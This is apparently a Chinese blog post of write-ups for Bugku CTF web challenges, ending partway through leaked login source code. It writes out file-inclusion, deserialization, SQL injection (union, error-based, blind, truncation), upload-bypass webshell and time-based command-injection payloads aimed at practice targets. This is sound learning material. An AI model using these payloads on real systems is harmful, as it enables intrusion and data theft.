+<h2 id="never-give-up"><a href="#never-give-up" class="headerlink" title="never give up"></a>never give up</h2><p>打开网页再f12发现没什么好搞的，于是burpsuit抓包发现1p.html</p>
+<p><img src="http://shifeng-kaze.cn/blog/bugku_web_wp/67cd1a251433e3c2c3d1f76c7b096059.png" alt=""></p>
+<p>在网页打开跳到了一个没什么用的社区网页，于是试着用burpsuit抓包，发现host不对</p>
+<p><img src="http://shifeng-kaze.cn/blog/bugku_web_wp/bfa027ac052d28b3627ea3f4c6117048.png" alt=""></p>
+<p>于是就拿之前的request修改后来go一下</p>
+<p><img src="http://shifeng-kaze.cn/blog/bugku_web_wp/345cd0bd4d7cb33921791b3d854bf31e.png" alt=""></p>
+<p>这个应该没错了，发现一大串base64编码，于是解码发现一大串url编码继续解码得到源码</p>
+<p><img src="http://shifeng-kaze.cn/blog/bugku_web_wp/6a86a11133d910819871b97d82796ec6.png" alt=""></p>
+<p>读源码，下面那块水平不够不会绕，于是试着直接加f4l2a3g.txt在url后，居然直接就能进去？？？</p>
+<p>不过还是想看看有没有绕过的办法，百度一下wp学到了一波操作<br>a因为是file_get_contents(),所以可以用a=php://input,然后用POST bugku is a nice plateform！ 即可<br>b可以用%00截断绕过，b=%00456789<br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;原理好像是eregi()可以用%00截断而substr()不行<br>id用id=%00或id=. 或id==0绕过<br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;第一个时%00确实存在因而不会被过滤，但int后值却是0<br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;第二个.转化成int后也是0（其实只要不是数字开头就行）<br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;第三个因为==后不能作为布尔值</p>
+<h2 id="welcome-to-bugkuctf"><a href="#welcome-to-bugkuctf" class="headerlink" title="welcome to bugkuctf"></a>welcome to bugkuctf</h2><p>打开页面F12，发现有段被注释的源码，复制下来读一下</p>
+<p><img src="http://shifeng-kaze.cn/blog/bugku_web_wp/02d7e1034e3a663eb9dd8a640f73952c.png" alt=""></p>
+<p>看到file_get_contents()函数想到用php://input通过<br>有include()和后面注释的hint.php，就想到用php://filter获取hint.php的源码<br>构造payload：<br><code>?txt=php://input&amp;file=php://filter/read=convert.base64-encode/resource=hint.php</code><br>并post welcome to the bugkuctf 获得一串base64编码的字符串</p>
+<p>接着进行解码得到源码</p>
+<p><img src="http://shifeng-kaze.cn/blog/bugku_web_wp/580c3ded00996e7703e5d5f641fcc352.png" alt=""></p>
+<p>可以看出hint.php里面有一个flag类并提示了有flag.php，但通过同样的方法不能获得flag.php里的内容，于是继续读类。可以看到这个类定义了一个file变量，同时用了一个魔术方法。<br>__tostring()这个方法在将一个对象当做一个字符串来使用时，会自动调用。可以看到调用这个方法后会输出对象中file值的文件。<br>因为hint.php中并没有设置Flag类的对象，于是可以得知在其他php中调用了hint.php<br>于是用同样方法获得index.php并解码</p>
+<p><img src="http://shifeng-kaze.cn/blog/bugku_web_wp/2ab9f1356df7c4168f1206ce96a908bb.png" alt=""></p>
+<p>可以看到flag被过滤掉于是不能直接查，于是只能寻其他路。发现有使用include()说明可以通过这里导入hint.php。继续看得知password参数会被反序列化后传给password变量然后echo。<br>到这里就很清楚了，因为echo的话若是Flag对象就会调用__tostring()方法，继而输出file值对应的文件，于是构造一个序列化后的字符串</p>
+<p><img src="http://shifeng-kaze.cn/blog/bugku_web_wp/8179087c8fd70b7a55003f12b23eafb3.png" alt=""></p>
+<p>然后构造payload</p>
+<p><img src="http://shifeng-kaze.cn/blog/bugku_web_wp/73e4c01f9e337e1dc3c4d49224c609a8.png" alt=""></p>
+<p>然而迷之没得到flag，用burpsuie也是，于是百度别人的wp，发现大佬们都出了？？？弃疗直接用flag了<br>flag{php_is_the_best_language}</p>
+<h2 id="过狗一句话"><a href="#过狗一句话" class="headerlink" title="过狗一句话"></a>过狗一句话</h2><p>打开题目就有一串php代码，先读一波</p>
+<p><img src="http://shifeng-kaze.cn/blog/bugku_web_wp/9bacec987657c5c869a5ed2f8758abf3.png" alt=""></p>
+<p>大概就是将$poc这个字符串以#来分割成一块块数组，然后再连接起来<br>最后就成assert()这个函数，assert()是用执行传进函数的代码。于是这里就想到传木马进行攻击，不过第一次做这种不太会操作就百度一下wp<br>查到能用scandir()进行目录扫描，用print_r()将数组打印出来，于是构建payloda：<code>?s=print_r(scandir(‘./’));</code></p>
+<p><img src="http://shifeng-kaze.cn/blog/bugku_web_wp/16ec8c0c097a4a16221049076c3b005a.png" alt=""></p>
+<p>然后直接查flag就行</p>
+<h2 id="字符？正则？"><a href="#字符？正则？" class="headerlink" title="字符？正则？"></a>字符？正则？</h2><p>打开有一段代码，先读一下</p>
+<p><img src="http://shifeng-kaze.cn/blog/bugku_web_wp/03386f7328b7b5fa8835411372645b70.png" alt=""></p>
+<p>大概就是用id传入一个值和里面的正则匹配就行，trim函数因为没有设其他参数，于是不用考虑对两侧进行绕过<br>然后读正则，不怎么碰读起来很难受，边看匹配规则边读总算写出来了<br>大概就是：<br>key+任意零或多个字符+key+任意4到7个字符+key:/+一个任意字符+/+任意零或多个字符+key+一个a到z的字符+任意一个符号<br>然后构造payload：<code>?id=key454545key12345key:/4/4545keya;</code> 获得flag</p>
+<h2 id="前女友-SKCTF"><a href="#前女友-SKCTF" class="headerlink" title="前女友(SKCTF)"></a>前女友(SKCTF)</h2><p>打开是一段令人愉快(x)的故事，看到有链接二字就去点了一下，果然有链接</p>
+<p><img src="http://shifeng-kaze.cn/blog/bugku_web_wp/036ea87116c474733804f5890c0e4b97.png" alt=""></p>
+<p>读代码，有两个要绕过的地方，一个是之前见过的md5()绕过，另一个是strcmp()。一开始我还以为strcmp()相等是返回1就顺便给了个参数，没想到不行。于是百度了一下才发现是返回0<br>然后查了一下strcmp()有什么漏洞能利用，查到php5.3前strcmp()用于数组和字符串比较时会返回-1，不过5.3以上已改成返回0可利用，试了一下可以</p>
+<p><img src="http://shifeng-kaze.cn/blog/bugku_web_wp/f9033209e09804f4f01a72a33f9831df.png" alt=""></p>
+<h2 id="login1-SKCTF"><a href="#login1-SKCTF" class="headerlink" title="login1(SKCTF)"></a>login1(SKCTF)</h2><p>点开发现提示sql约束攻击，于是去百度一下，大致原理是数据库的列设置了长度之后，若数据过长会自动截取设置的长度。具体操作一次</p>
+<p>先猜测是admin账号然后开始sql约束攻击</p>
+<p><img src="http://shifeng-kaze.cn/blog/bugku_web_wp/ec3a608abee0eedb49f107411dac3dd3.png" alt=""></p>
+<p>先用 admin&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;1作为用户名注册<br>中间一大串空格在传入数据库是会被转义成字符计入长度中，于是过长的话存在数据库里是就会被截成admin。而查询时会从上查询，于是登录时虽然使用我们的账号密码，但返回数据时则是原admin账号的数据<br>登录得到flag</p>
+<p>不过我觉得这个漏洞应该是用在修改密码上的，因为大多都会用分离式登录，而且不会去取第二个数据，所以登录很难做到</p>
+<h2 id="你从哪里来"><a href="#你从哪里来" class="headerlink" title="你从哪里来"></a>你从哪里来</h2><p>打开就问我是不是来自google，于是用burpsuit抓包<br>把referer修改成google的域名得flag</p>
+<h2 id="md5-collision-NUPT-CTF"><a href="#md5-collision-NUPT-CTF" class="headerlink" title="md5 collision(NUPT_CTF)"></a>md5 collision(NUPT_CTF)</h2><p>这道题没解出是由于之前0e那个没有完全理解清楚，当md5()后0e开头的都会认为是0的科学计数法，导致值为0。然后由于弱类型漏洞，导致 0==非数字开头字符串 从而绕过<br>给a传入个MD5后为0e开头的字符串就行</p>
+<h2 id="程序员本地网站"><a href="#程序员本地网站" class="headerlink" title="程序员本地网站"></a>程序员本地网站</h2><p>看题目还以为又是referer，但用burpsuit抓包后修改没成功。想了好久没想法于是百度，发现头协议里还有个叫X-Forwarded-For的协议<br>这个协议用来标记http请求端的真实ip，只有在通过代理或负载均衡服务器才会添加这个<br>于是添加并设为127.0.0.1获得flag</p>
+<h2 id="各种绕过"><a href="#各种绕过" class="headerlink" title="各种绕过"></a>各种绕过</h2><p>看题目还以为会有一堆要绕过的，但认真读一下代码，要绕的只有shal()这个函数。之前在看md5()文档时好像有看到过这个函数，于是尝试用md5()的方法来试着绕过，让两个变量都成数组</p>
+<p><img src="http://shifeng-kaze.cn/blog/bugku_web_wp/69a7d89569fe4e8b851d84ab4859e75a.png" alt=""></p>
+<h2 id="web8"><a href="#web8" class="headerlink" title="web8"></a>web8</h2><p>这题挺简单的，读源码</p>
+<p><img src="http://shifeng-kaze.cn/blog/bugku_web_wp/5c5837e3a64c26c358e8b8c819a5c14a.png" alt=""></p>
+<p>大概就是传入两个参数ac存在，且等于fn对应的文件里的内容就出flag。<br>进题目时提示了“txt？？？？”，于是试一下flag.txt，结果得到了里面的文本</p>
+<p><img src="http://shifeng-kaze.cn/blog/bugku_web_wp/69a7d89569fe4e8b851d84ab4859e75a.png" alt=""></p>
+<p>剩下就很简单了，构造payload： <code>?ac=flags&amp;fn=flag.txt</code> 得flag</p>
+<h2 id="细心"><a href="#细心" class="headerlink" title="细心"></a>细心</h2><p>打开页面没什么东西，整蛊了好久也没搞出什么，也没什么头绪就百度看看<br>于是又学到一个新东西，每个网站为了自己有一些地址不被网络爬虫爬到，会设置一个robots.txt。里面的 User-agent: 是用来标识哪些用户不能访问 Disallow：里的地址。每个爬虫读取这个网站前就会先读取这个txt再进行下一步。<br>于是打开看看</p>
+<p><img src="http://shifeng-kaze.cn/blog/bugku_web_wp/99295ad25288678e6ab1c6ccc0eeec5e.png" alt=""></p>
+<p>里面禁止了所有爬虫爬resusl.php，于是我们就打开这个php看看</p>
+<p><img src="http://shifeng-kaze.cn/blog/bugku_web_wp/ed53afc136bae297e32b148b61ec2472.png" alt=""></p>
+<p>根据下面的代码以及提示了想办法变成admin，就尝试x=admin，结果成功出flag</p>
+<h2 id="求getshell"><a href="#求getshell" class="headerlink" title="求getshell"></a>求getshell</h2><p>打开页面是要文件上传，这块不是很会就去看看大佬们的上传姿势<br>操作是上传一个getshell.php，然后burpsuit抓包后吧contant-type改为可上传的image/jpg，filename中把扩展名改成php5这种非常用的扩展名，然后multipart/form-data;把m大写绕过（这里不是很懂原理），接着得flag</p>
+<p><img src="http://shifeng-kaze.cn/blog/bugku_web_wp/faea28a76e07622bdea0cfe53d878892.png" alt=""></p>
+<h2 id="insert-into注入"><a href="#insert-into注入" class="headerlink" title="insert into注入"></a>insert into注入</h2><h2 id="这是一个神奇的登陆框"><a href="#这是一个神奇的登陆框" class="headerlink" title="这是一个神奇的登陆框"></a>这是一个神奇的登陆框</h2><p>看页面应该是一个post类型的注入，这次就学着用一下sqlmap注入看看<br>首先用burpsuit抓包</p>
+<p><img src="http://shifeng-kaze.cn/blog/bugku_web_wp/6cbb5592738381e3c5591c071fbd3a38.png" alt=""></p>
+<p>保存为1.txt在D盘中，然后打开sqlmap读取1.txt并获取数据库名字</p>
+<p><img src="http://shifeng-kaze.cn/blog/bugku_web_wp/99596ce368d5f5f19fd13a5e755cc908.png" alt=""></p>
+<p><img src="http://shifeng-kaze.cn/blog/bugku_web_wp/3a6f1f988a35c9dd10869e3a84d73150.png" alt=""></p>
+<p>接着获取表名，列名，flag</p>
+<p><img src="http://shifeng-kaze.cn/blog/bugku_web_wp/b33ef257ffcb190b6559e605949342d0.png" alt=""></p>
+<p><img src="http://shifeng-kaze.cn/blog/bugku_web_wp/2a6ab03c373796dc645f627ce97f3d96.png" alt=""></p>
+<p><img src="http://shifeng-kaze.cn/blog/bugku_web_wp/4128efd4b359a6c6c21a1d684fc8b605.png" alt=""></p>
+<p><img src="http://shifeng-kaze.cn/blog/bugku_web_wp/318a777fe0d31508317aaa7516a91252.png" alt=""></p>
+<p><img src="http://shifeng-kaze.cn/blog/bugku_web_wp/378575a887742a61fbdc739fb7637570.png" alt=""></p>
+<p><img src="http://shifeng-kaze.cn/blog/bugku_web_wp/3e55c2ae38bac14b0da3aee7dc1612d2.png" alt=""></p>
+<h2 id="多次"><a href="#多次" class="headerlink" title="多次"></a>多次</h2><p>打开页面，url上有id这个参数，尝试1、2、3发现显示文字改变，用0时显示error，就先确定时道sql注入题。<br>接着在后面加’发现出错</p>
+<p><img src="http://shifeng-kaze.cn/blog/bugku_web_wp/e0ac9c53d3d47705e6e4163b7affe174.png" alt=""></p>
+<p>然后尝试#和%23，发现加%23后页面正常，于是可以开始注入</p>
+<p><img src="http://shifeng-kaze.cn/blog/bugku_web_wp/ae8f5a78214fcb9223bde35789006e0c.png" alt=""></p>
+<p>但用order by和union select时都出错了，应该是有过滤，于是用异或注入来判断。<br>若过滤时通过正则代替的话，那么1’^(length(‘union’)=5)这条语句就会返回1显示正常，而1’^(length(‘union’)=0)则返回0显示error，因为这里union被换成空字符串了。接着尝试几个会用到的order、by、union、select、gruop_concat()</p>
+<p><img src="http://shifeng-kaze.cn/blog/bugku_web_wp/9de907b726c6a3a53e871dacead87c87.png" alt=""></p>
+<p><img src="http://shifeng-kaze.cn/blog/bugku_web_wp/2768c41ef06dc8dc5e8a449d1542be2f.png" alt=""></p>
+<p>order出现了和预测不一样的结果，进过几次测试后发现时过滤了or<br>payload:</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">0’ uunionion selecselectt 1,group_concat(table_name) from information_schema.tables where table_schema=database()%23</span><br><span class="line">0&apos; uunionnion selecselectt 1,group_concat(column_name) from infoorrmation_schema.columns where table_name=&apos;flag1&apos;%23</span><br><span class="line">0&apos; uunionnion selecselectt 1,group_concat(flag1) from flag1%23</span><br></pre></td></tr></table></figure>
+<p>得到flag</p>
+<p><img src="http://shifeng-kaze.cn/blog/bugku_web_wp/2a04e995fe599565a36ccf1841d82cce.png" alt=""></p>
+<p>这个不知道能不能用，但题目说有两个flag就继续找了<br>接着取查另一个列address，得到一个链接</p>
+<p><img src="http://shifeng-kaze.cn/blog/bugku_web_wp/56a248513b8eebc495a51d133a839330.png" alt=""></p>
+<p>进入网页同样操作试遍，发现只有union被过滤，但双写不起作用了，应该是发现非法字符直接不继续sql查询，于是试试看报错注入，结果成功<br>payload:</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">0&apos; or updatexml(1,concat(0x7e,(select group_concat(table_name) from information_schema.tables where table_schema=database())),0)%23</span><br><span class="line">0&apos; or updatexml(1,concat(0x7e,(select group_concat(column_name) from information_schema.columns where table_name=&apos;flag2&apos;)),0)%23</span><br><span class="line">0&apos; or updatexml(1,concat(0x7e,(select group_concat(flag2) from flag2)),0)%23</span><br></pre></td></tr></table></figure>
+<h2 id="PHP-encrypt-1-ISCCCTF"><a href="#PHP-encrypt-1-ISCCCTF" class="headerlink" title="PHP_encrypt_1(ISCCCTF)"></a>PHP_encrypt_1(ISCCCTF)</h2><p>题目给了一个 php，先下来读一下</p>
+<p><img src="http://shifeng-kaze.cn/blog/bugku_web_wp/70e57b8ffab51797145b9112bae8e7d0.png" alt=""></p>
+<p>是一个加密题，加密过程是先将ISCC进行md5，把字符串赋给key。然后将key的字符一个个递给char，但key字符不够用时就从头继续递，直到char和data一样长。然后在把char和data同位置上的字符串ascii码值的和与128求余，再转回字符后传给str，最终将str解码</p>
+<p>基本上没什么难度，写个python破解出来就行</p>
+<p><img src="http://shifeng-kaze.cn/blog/bugku_web_wp/1b83e4dd93cddb113878c318b6220414.png" alt=""></p>
+<h2 id="文件包含2"><a href="#文件包含2" class="headerlink" title="文件包含2"></a>文件包含2</h2><p>打开看到有?file=就尝试index.php和flag.php，但无输出。尝试../../etc/passwd、php://filter被过滤，于是F12发现upload.php</p>
+<p>打开是个上传页面，于是构造一句话<script language="php">system(“ls”)</script>(其他的好像都被过滤了)，保存为1.php.jpg后上传，然后打开文件所在位置获得目录下所有文件名</p>
+<p><img src="http://shifeng-kaze.cn/blog/bugku_web_wp/26f3da559fa06fcde09d37928f9a9590.png" alt=""></p>
+<p>最后读取flag文件</p>
+<h2 id="flag-php"><a href="#flag-php" class="headerlink" title="flag.php"></a>flag.php</h2><p>打开页面login果然不能点，然后转到flag.php什么都没用，试着post到flag.php然后设admin和hint也不行，抓包也没用，就懵逼了。查了查wp发现hint原来是当参数用的orz</p>
+<p><img src="http://shifeng-kaze.cn/blog/bugku_web_wp/8a543ba93d0959e0792199a80a9543dc.png" alt=""></p>
+<p>然后就是读代码了，大概就是要再cookie中放一个ISecer，它的值序列化后为空。讲道理为什么这个代码不会出错啊<br>还有;要用url编码%3B</p>
+<h2 id="sql注入2"><a href="#sql注入2" class="headerlink" title="sql注入2"></a>sql注入2</h2><p>这题是真tm绝望，各种找办法绕过然而都失败了，最后无奈百度wp<br>然后只能说再也不信题目了，是完全没看过的源码泄漏<br>用ds_store_exp-master跑一下，就找到flag了</p>
+<p><img src="http://shifeng-kaze.cn/blog/bugku_web_wp/d7226761a08a56c6e278c21af88e4969.png" alt=""></p>
+<h2 id="孙xx的博客"><a href="#孙xx的博客" class="headerlink" title="孙xx的博客"></a>孙xx的博客</h2><p>这题说是被玩烂了，等能搞了再说吧</p>
+<h2 id="报错注入"><a href="#报错注入" class="headerlink" title="报错注入"></a>报错注入</h2><h2 id="Trim的日记本"><a href="#Trim的日记本" class="headerlink" title="Trim的日记本"></a>Trim的日记本</h2><p>看题目的模样看起来是搞二次注入，但用了各种方法都不行<br>然后拿御剑扫一波没想到扫出了个show.php，打开就是flag，这题有点坑</p>
+<p><img src="http://shifeng-kaze.cn/blog/bugku_web_wp/f441a0c08602b0aff8221b2b9d23a060.png" alt=""></p>
+<p><img src="http://shifeng-kaze.cn/blog/bugku_web_wp/369acf7a6187ed4c992ed133d7188170.png" alt=""></p>
+<p>里面一个ID都没有，看不懂这题啊，估计被人改了？</p>
+<h2 id="login2-SKCTF"><a href="#login2-SKCTF" class="headerlink" title="login2(SKCTF)"></a>login2(SKCTF)</h2><p>这题进去是个登录页面，整了一会没弄出什么，于是试着用burpsuit抓包</p>
+<p><img src="http://shifeng-kaze.cn/blog/bugku_web_wp/2863ecfc76f8b927924ccd2514a40548.png" alt=""></p>
+<p>发现tip里有一串base64，解码</p>
+<p><img src="http://shifeng-kaze.cn/blog/bugku_web_wp/1ead8dc9018e4c9621cccf8f4e2c37a5.png" alt=""></p>
+<p>这里是分离式的用户密码验证，绕开md5()是重点<br>于是构造payload:<br><code>username = admin&#39; union select md5(1),md5(1)#&amp;password=1</code><br>登录成功，进去是个命令执行页面</p>
+<p><img src="http://shifeng-kaze.cn/blog/bugku_web_wp/8262360a06dba00fd63d73a4b6e9c189.png" alt=""></p>
+<p>这里尝试过反弹shell但不知道为什么没成功于是换用盲注</p>
+<p>构造payload：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">c=123;a=`ls`;b=&apos;a&apos;;if [ $&#123;a:0:1&#125; == $b ];then sleep 5;fi</span><br></pre></td></tr></table></figure></p>
+<p>把整个目录跑出来，得到fLag_c2Rmc2Fncn-MzRzZGZnNDc.txt<br>然后再构造payload：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">c=123;a=`fLag_c2Rmc2Fncn-MzRzZGZnNDc.txt\`;b=&apos;a&apos;;if [ $&#123;a:0:1&#125; == $b ];then sleep 5;fi</span><br></pre></td></tr></table></figure></p>
+<p>跑出flag</p>
+<h2 id="login3-SKCTF"><a href="#login3-SKCTF" class="headerlink" title="login3(SKCTF)"></a>login3(SKCTF)</h2><p>这题进去后试了几下，发现有进行过滤<br>于是写个脚本跑一下过滤了什么</p>
+<p>发现空格 , union = and information被过滤 </p>
+<p>空格被过滤了用()代替，逗号尽量不用，union过滤了就不能用正常注入，不过这题没有返回什么也用不了。and被代替用or或^，这次用^来做。等号被过滤用&lt;&gt;代替，information被过滤就不能一步步查了，直接猜另一列位passwd或password看看，结果是password。</p>
+<p>于是写个脚本，构造盲注语句：<br><code>admin&#39;^(ascii(substr((password)from(m)))&lt;&gt;n)^0#</code></p>
+<p>这里因为空格被过滤就不能用from…for，不过只用from也是可以，from会从标记的位置进行截断获取后面的字符串，而ascii()只会获取字符串第一个字符<br>然后跑一下出密码</p>
+<p><img src="http://shifeng-kaze.cn/blog/bugku_web_wp/6b4549da7e8ab5d2135b1fd5ccec97e2.png" alt=""></p>
+<p>（盲注还是二分法写吧，真的慢）<br>可以看出是个md5加密，于是找个网站解码出来是skctf123456<br>用这个密码登录就得到flag</p>
+<h2 id="文件上传2-湖湘杯"><a href="#文件上传2-湖湘杯" class="headerlink" title="文件上传2(湖湘杯)"></a>文件上传2(湖湘杯)</h2><p>看到文件上传的题还是没什么想法，还是查查wp看看<br>然后发现直接用php://filter就搞出来了，又这么坑吗orz</p>
+<p><img src="http://shifeng-kaze.cn/blog/bugku_web_wp/f77af8f172266d1fe439f7002061ea87.png" alt=""></p>
+<p>直接读出base64的flag，解码就是</p>
+<h2 id="login4"><a href="#login4" class="headerlink" title="login4"></a>login4</h2><p>这道题和实验吧见到过很像的，基本就是一样的题，但还是搞了很久</p>
+<p>首先第一步就没搞出来，查了才知道有.swp这种临时文件，如果不删可能导致源码泄漏，于是url后加.index.php.swp获得<br>然后在linux上用终端输入命令行 vim -r .index.php.swp还原得到源码</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br></pre></td><td class="code"><pre><span class="line">&lt;!DOCTYPE html PUBLIC &quot;-//W3C//DTD XHTML 1.0 Transitional//EN&quot; &quot;http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd&quot;&gt;</span><br><span class="line">&lt;html&gt;</span><br><span class="line">&lt;head&gt;</span><br><span class="line">&lt;meta http-equiv=&quot;Content-Type&quot; content=&quot;text/html; charset=utf-8&quot; /&gt;</span><br><span class="line">&lt;title&gt;Login Form&lt;/title&gt;</span><br><span class="line">&lt;link href=&quot;static/css/style.css&quot; rel=&quot;stylesheet&quot; type=&quot;text/css&quot; /&gt;</span><br><span class="line">&lt;script type=&quot;text/javascript&quot; src=&quot;static/js/jquery.min.js&quot;&gt;&lt;/script&gt;</span><br><span class="line">&lt;script type=&quot;text/javascript&quot;&gt;</span><br><span class="line">$(document).ready(function() &#123;</span><br><span class="line">	$(&quot;.username&quot;).focus(function() &#123;</span><br><span class="line">		$(&quot;.user-icon&quot;).css(&quot;left&quot;,&quot;-48px&quot;);</span><br><span class="line">	&#125;);</span><br><span class="line">	$(&quot;.username&quot;).blur(function() &#123;</span><br><span class="line">		$(&quot;.user-icon&quot;).css(&quot;left&quot;,&quot;0px&quot;);</span><br><span class="line">	&#125;);</span><br><span class="line"></span><br><span class="line">	$(&quot;.password&quot;).focus(function() &#123;</span><br><span class="line">		$(&quot;.pass-icon&quot;).css(&quot;left&quot;,&quot;-48px&quot;);</span><br><span class="line">	&#125;);</span><br><span class="line">	$(&quot;.password&quot;).blur(function() &#123;</span><br><span class="line">		$(&quot;.pass-icon&quot;).css(&quot;left&quot;,&quot;0px&quot;);</span><br><span class="line">	&#125;);</span><br><span class="line">&#125;);</span><br><span class="line">&lt;/script&gt;</span><br><span class="line">&lt;/head&gt;</span><br><span class="line"></span><br><span class="line">&lt;?php</span><br><span class="line">define(&quot;SECRET_KEY&quot;, file_get_contents(&apos;/root/key&apos;));</span><br><span class="line">define(&quot;METHOD&quot;, &quot;aes-128-cbc&quot;);</span><br><span class="line">session_start();</span><br><span class="line"></span><br><span class="line">function get_random_iv()&#123;</span><br><span class="line">    $random_iv=&apos;&apos;;</span><br><span class="line">    for($i=0;$i&lt;16;$i++)&#123;</span><br><span class="line">        $random_iv.=chr(rand(1,255));</span><br><span class="line">    &#125;</span><br><span class="line">    return $random_iv;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">function login($info)&#123;</span><br><span class="line">    $iv = get_random_iv();</span><br><span class="line">    $plain = serialize($info);</span><br><span class="line">    $cipher = openssl_encrypt($plain, METHOD, SECRET_KEY, OPENSSL_RAW_DATA, $iv);</span><br><span class="line">    $_SESSION[&apos;username&apos;] = $info[&apos;username&apos;];</span><br><span class="line">    setcookie(&quot;iv&quot;, base64_encode($iv));</span><br><span class="line">    setcookie(&quot;cipher&quot;, base64_encode($cipher));</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">function check_login()&#123;</span><br><span class="line">    if(isset($_COOKIE[&apos;cipher&apos;]) &amp;&amp; isset($_COOKIE[&apos;iv&apos;]))&#123;</span><br><span class="line">        $cipher = base64_decode($_COOKIE[&apos;cipher&apos;]);</span><br><span class="line">        $iv = base64_decode($_COOKIE[&quot;iv&quot;]);</span><br><span class="line">        if($plain = openssl_decrypt($cipher, METHOD, SECRET_KEY, OPENSSL_RAW_DATA, $iv))&#123;</span><br><span class="line">            $info = unserialize($plain) or die(&quot;&lt;p&gt;base64_decode(&apos;&quot;.base64_encode($plain).&quot;&apos;) can&apos;t unserialize&lt;/p&gt;&quot;);</span><br><span class="line">            $_SESSION[&apos;username&apos;] = $info[&apos;username&apos;];</span><br><span class="line">        &#125;else&#123;</span><br><span class="line">            die(&quot;ERROR!&quot;);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">function show_homepage()&#123;</span><br><span class="line">    if ($_SESSION[&quot;username&quot;]===&apos;admin&apos;)&#123;</span><br><span class="line">        echo &apos;&lt;p&gt;Hello admin&lt;/p&gt;&apos;;</span><br><span class="line">        echo &apos;&lt;p&gt;Flag is $flag&lt;/p&gt;&apos;;</span><br><span class="line">    &#125;else&#123;</span><br><span class="line">        echo &apos;&lt;p&gt;hello &apos;.$_SESSION[&apos;username&apos;].&apos;&lt;/p&gt;&apos;;</span><br><span class="line">        echo &apos;&lt;p&gt;Only admin can see flag&lt;/p&gt;&apos;;</span><br><span class="line">    &#125;</span><br><span class="line">    echo &apos;&lt;p&gt;&lt;a href=&quot;loginout.php&quot;&gt;Log out&lt;/a&gt;&lt;/p&gt;&apos;;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">if(isset($_POST[&apos;username&apos;]) &amp;&amp; isset($_POST[&apos;password&apos;]))&#123;</span><br><span class="line">    $username = (string)$_POST[&apos;username&apos;];</span><br><span class="line">    $password = (string)$_POST[&apos;password&apos;];</span><br><span class="line">    if($username === &apos;admin&apos;)&#123;</span><br><span class="line">        exit(&apos;&lt;p&gt;admin are not allowed to login&lt;/p&gt;&apos;);</span><br><span class="line">    &#125;else&#123;</span><br><span class="line">        $info = array(&apos;username&apos;=&gt;$username,&apos;password&apos;=&gt;$password);</span><br><span class="line">        login($info);</span><br><span class="line">        show_homepage();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;else&#123;</span><br><span class="line">    